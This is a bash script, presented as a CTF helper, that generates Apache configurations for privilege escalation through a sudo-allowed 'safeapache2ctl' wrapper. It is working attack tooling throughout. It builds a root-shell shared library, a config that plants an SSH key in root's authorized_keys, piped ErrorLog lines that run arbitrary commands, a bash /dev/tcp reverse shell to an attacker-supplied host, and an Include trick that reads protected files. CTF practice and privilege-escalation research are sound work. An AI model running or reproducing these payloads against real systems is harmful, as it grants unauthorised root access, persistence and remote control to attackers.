#!/bin/bash
#
# apache-privesc-helper.sh
# CTF helper to generate Apache configs and malicious modules for privesc
#

set -e

CONF_DIR="/tmp/apache_privesc"
SO_PAYLOAD="$CONF_DIR/root.so"
CONFIG_FILE="$CONF_DIR/payload.conf"
SUID_SHELL="/tmp/rootbash"

mkdir -p "$CONF_DIR"

banner() {
    echo "====================================="
    echo "[*] Apache PrivEsc Helper"
    echo "====================================="
}

make_so_payload() {
    echo "[*] Generating malicious .so payload..."
    cat > "$CONF_DIR/root.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void run() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
    gcc -fPIC -shared -o "$SO_PAYLOAD" "$CONF_DIR/root.c"
    echo "[+] Built $SO_PAYLOAD"
}

make_loadfile_conf() {
    echo "[*] Building LoadFile config..."
    cat > "$CONFIG_FILE" <<EOF
ServerRoot "/etc/apache2"
PidFile "/tmp/httpd.pid"
ErrorLog "/tmp/apache_error.log"
Listen 8080
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so

LoadFile $SO_PAYLOAD
EOF
    echo "[+] Config ready at $CONFIG_FILE"
}

make_customlog_conf() {
    PUBKEY="$1"
    if [[ -z "$PUBKEY" ]]; then
        echo "[-] Provide your pubkey string as argument"
        exit 1
    fi
    cat > "$CONFIG_FILE" <<EOF
ServerRoot "/etc/apache2"
PidFile "/tmp/httpd.pid"
ErrorLog "/tmp/apache_error.log"
Listen 8080
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so

CustomLog "/root/.ssh/authorized_keys" "$PUBKEY"
EOF
    echo "[+] Config ready at $CONFIG_FILE"
}

make_errorlog_conf() {
    CMD="$1"
    if [[ -z "$CMD" ]]; then
        echo "[-] Provide a command to run"
        exit 1
    fi
    cat > "$CONFIG_FILE" <<EOF
ServerRoot "/tmp"
ServerName localhost
PidFile "/tmp/httpd.pid"
ErrorLog "|/bin/sh -c '$CMD'"
Listen 8080
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
EOF
    echo "[+] Config ready at $CONFIG_FILE"
}

make_revshell_conf() {
    LHOST="$1"
    LPORT="$2"
    if [[ -z "$LHOST" || -z "$LPORT" ]]; then
        echo "[-] Usage: $0 rev <LHOST> <LPORT>"
        exit 1
    fi
    RSHELL="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
    cat > "$CONFIG_FILE" <<EOF
ServerRoot "/tmp"
ServerName localhost
PidFile "/tmp/httpd.pid"
ErrorLog "|/bin/sh -c '$RSHELL'"
Listen 8080
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
EOF
    echo "[+] Reverse shell config ready at $CONFIG_FILE"
    echo "[!] Start a listener with: nc -lvnp $LPORT"
}

make_read_conf() {
    TARGET="$1"
    if [[ -z "$TARGET" ]]; then
        echo "[-] Usage: $0 read <target_file>"
        exit 1
    fi
    cat > "$CONFIG_FILE" <<EOF
ServerRoot "/etc/apache2"
PidFile "/tmp/httpd.pid"
ErrorLog "/tmp/apache_error.log"
Listen 8080
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so

Include $TARGET
EOF
    echo "[+] Read config ready at $CONFIG_FILE"
    echo "[!] Run with: sudo /usr/local/bin/safeapache2ctl -f $CONFIG_FILE configtest"
}

cleanup() {
    echo "[*] Cleaning up..."
    rm -f "$SO_PAYLOAD" "$CONF_DIR/root.c" "$CONFIG_FILE" 2>/dev/null || true
    rm -f "$SUID_SHELL" 2>/dev/null || true
    rm -f /tmp/apache_error.log 2>/dev/null || true
    echo "[+] Removed payloads, configs, and artifacts."
}

usage() {
    echo "Usage:"
    echo "  $0 so               # build .so payload and config (LoadFile)"
    echo "  $0 key <pubkey>     # build CustomLog config to drop pubkey"
    echo "  $0 cmd <command>    # build ErrorLog config to run command"
    echo "  $0 rev <LHOST> <LPORT> # build ErrorLog config for reverse shell"
    echo "  $0 read <file>      # build Include config to read a file"
    echo "  $0 clean            # remove artifacts (configs, .so, suid bash)"
}

banner

case "$1" in
    so)
        make_so_payload
        make_loadfile_conf
        ;;
    key)
        shift
        make_customlog_conf "$*"
        ;;
    cmd)
        shift
        make_errorlog_conf "$*"
        ;;
    rev)
        shift
        make_revshell_conf "$1" "$2"
        ;;
    read)
        shift
        make_read_conf "$1"
        ;;
    clean)
        cleanup
        ;;
    *)
        usage
        exit 1
        ;;
esac

if [[ "$1" != "clean" ]]; then
    echo "[*] Done. Run with:"
    if [[ "$1" == "read" ]]; then
        echo "    sudo /usr/local/bin/safeapache2ctl -f $CONFIG_FILE configtest"
    else
        echo "    sudo /usr/local/bin/safeapache2ctl -f $CONFIG_FILE start"
    fi
fi
